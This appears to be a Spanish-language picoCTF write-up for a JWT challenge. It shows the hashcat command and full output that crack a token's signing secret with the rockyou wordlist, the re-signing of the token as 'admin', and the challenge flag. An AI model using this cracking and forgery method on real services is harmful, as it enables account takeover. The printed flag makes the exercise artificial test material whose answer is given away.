## Objetivo
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864

## Solución

En este reto nosotros vamos a iniciar sesión en la página https://jupiter.challenges.picoctf.org/problem/61864/, donde podemos ver una scratchpad, nosotros una vez iniciada la sesión, vamos a obtener una cookie, jwt, mediante la extensión cookie editor, una vez obtenida, la vamos a almacenar en un archivo, y además iremos a conseguir el diccionario rockyou.txt, yo lo conseguí de esta página https://github.com/zacheller/rockyou, una vez descomprimido usaremos una herramienta llamada hashcat con el siguiente comando

```bash
hashcat -m 16500 hash rockyou.txt -o pass.txt
```

Luego una vez hecho el intento de crackeo por ataque de diccionario, nosotros hacemos un cat a el archivo pass.txt y observaremos que efectivamente el resultado fue

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibWlndWVsIn0.N4hIwNhPMz6JxK4p59Hm3USJKz9px5JsqEBnEZTuJvE:ilovepico
```

Esto ya podremos ingresarlo en el sitio jwt.io y cambiarnos la contraseña y el nombre a ilovepico y admin, esta nueva cookie generada la podremos ingresar en el sitio JaWT y obtener la bandera


```bash
mrfear@nightmare ~/home/Desktop
 % ls
rockyou.txt
mrfear@nightmare ~/home/Desktop
 % ls -la
total 136644
drwxrwxrwx 1 mrfear mrfear      4096 Mar  2 16:54 .
drwxrwxrwx 1 mrfear mrfear      4096 Feb 24 19:30 ..
-rwxrwxrwx 1 mrfear mrfear 139921497 Sep 23  2015 rockyou.txt
mrfear@nightmare ~/home/Desktop
 % head rockyou.txt
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
mrfear@nightmare ~/home/Desktop
 % echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibWlndWVsMTgifQ.v3E2uXhWfND9OCdfHk-Sv6EUtnW1vfh1VhzwvIqM3kk" >> hashmiguel
mrfear@nightmare ~/home/Desktop
 % cat hashmiguel
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibWlndWVsMTgifQ.v3E2uXhWfND9OCdfHk-Sv6EUtnW1vfh1VhzwvIqM3kk
mrfear@nightmare ~/home/Desktop
 % echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibWlndWVsIn0.N4hIwNhPMz6JxK4p59Hm3USJKz9px5JsqEBnEZTuJvE" > hash
mrfear@nightmare ~/home/Desktop
 % hashcat -m 16500 hash rockyou.txt -o pass.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-Intel(R) Core(TM) i5-8265U CPU @ 1.60GHz, 1408/2881 MB (512 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384


Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibW...ZTuJvE
Time.Started.....: Sun Mar  3 18:02:48 2024 (7 secs)
Time.Estimated...: Sun Mar  3 18:02:55 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1128.0 kH/s (0.72ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7395328/14344384 (51.56%)
Rejected.........: 0/7395328 (0.00%)
Restore.Point....: 7393280/14344384 (51.54%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: iloverober2117* -> ilovepaul.

Started: Sun Mar  3 18:02:47 2024
Stopped: Sun Mar  3 18:02:56 2024
mrfear@nightmare ~/home/Desktop
 % ls
 hash   pass.txt   rockyou.txt
mrfear@nightmare ~/home/Desktop
 % cat pass.txt
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibWlndWVsIn0.N4hIwNhPMz6JxK4p59Hm3USJKz9px5JsqEBnEZTuJvE:ilovepico
mrfear@nightmare ~/home/Desktop
 %

```


## Bandera
picoCTF{jawt_was_just_what_you_thought_1ca14548}
## Notas

## Referencias